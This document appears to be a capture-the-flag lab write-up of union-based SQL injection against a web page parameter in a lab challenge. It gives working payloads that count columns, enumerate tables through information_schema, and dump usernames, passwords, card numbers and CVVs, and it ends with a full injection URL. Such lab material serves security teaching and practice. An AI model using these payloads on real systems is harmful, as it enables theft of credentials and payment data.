---
date: 2025-01-09
categories: [CTF, IML]
title: "IML - CVE-2019-7548 (SQLAlchemy)"
tags: ['john the ripper', 'privilege escalation', 'rce', 'sqli']

description: "CVE-2019-7548 (SQLAlchemy) - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - CVE-2019-7548 (SQLAlchemy)


![image1](../resources/104530e8ce9144b8a7ca03ac32614d0e.png)
- Firstly we can see that there is a parameter that might be vulnerable to SQLi

- To test it, we can use a ' to break it


![image2](../resources/d8bf8d75a94a4170a70d85c6b3ba5aad.png)

- From here I use the order by query to find out how many columns the table has (trial and error)
- It errors at 9 so the table has 8 columns


![image3](../resources/984207172f12488180dea99b65e72f19.png)

- Now we can do union select 1,2,3,4,5,6,7,8 because the UNION has to have the same number of columns as the current table
- It was trial and error to find where the values were being reflected but I found it on the last page (221)


![image4](../resources/45d4e42d268e4f15b847b63869a89c21.png)

- Now we know where it is being reflected, we can get some information

- First find the type of DB and version:
```bash
union select 1,2,3,4,5,6,7,@@version

```

![image5](../resources/f1c0775cca67428696907ffe913c20f1.png)


![image6](../resources/8044a757cc3b464fb34e869b2fc7a778.png)

- Answering the questions:


![image7](../resources/a2dd9612bc6748a585a84b6c592ff62f.png)

- First let's get the database name - and because it's MariaDB we use:
```bash
database()

```

![image8](../resources/7f234af64aac45ad8e1ff0f5c947d401.png)


![image9](../resources/dec72510ef8b447db6c52a9e5dd96063.png)

- We can now enumerate the tables with:
```bash
union select 1,2,3,4,5,6,7,group_concat(table_name) from information_schema.tables where table_schema="website"

```

![image10](../resources/6b0ecc57e49041fcb53f7cfe8362e3c6.png)


![image11](../resources/82862971d33e4232ac1702f82d18e392.png)

- From here we get the tables <u>transactions and users</u>

- First let's enumerate the table users:
```bash
union select 1,2,3,4,5,6,7,group_concat(column_name) from information_schema.columns where table_name="users"

```

![image12](../resources/145d79b48ef74c3dbcb21e5f71d3d5df.png)


![image13](../resources/555d41cda3044677835d147a5a471cca.png)

- Here we get the columns
id,firstName,lastName,country,username,email,password,cardNumber,cardIssuer,cardExpiry,cardCVV

- To read the columns we do:
```bash
union select 1,2,3,4,5,6,7,group_concat(username,0x2b,password) from users

```
This will read and concat the two columns: username and password. The 0x2b is a delimeter to make it more easily readable


![image14](../resources/4b86829c5e38449f975d1b0dafc6b90e.png)


![image15](../resources/7a89bc3750c74a5ab5453c7f45f549d0.png)

- To narrow it down do:
```bash
union select 1,2,3,4,5,6,7,group_concat(username,0x2b,password) from users where username="ywalsh"

```

![image16](../resources/de5d883935e541b8ac32e77470a54c04.png)


![image17](../resources/a120b72b04354575bee352859d7e0a86.png)
- Use the following:

```bash
union select 1,2,3,4,5,6,7,group_concat(firstName,lastName,0x2b,cardNumber) from users where lastname="Park" and firstName="Shelly"

```

![image18](../resources/d61564005d864108a738b68e5f912633.png)

- Use the following:
```bash
union select 1,2,3,4,5,6,7,group_concat(firstName,lastName,0x2b,cardCVV) from users where lastname="Elliott" and firstName="John"

```

![image19](../resources/c6b6ddc750aa47ba864f1e159c50b957.png)


![image20](../resources/6ff53b6b417f46ac9ddf011edf26bc22.png)

Full URL for this is:

[http://10.102.16.9/?page=221&group=email%20union%20select%201,2,3,4,5,6,7,group_concat(firstName,lastName,0x2b,cardCVV)%20from%20users%20where%20lastname=%22Elliott%22%20and%20firstName=%22John%22](http://.)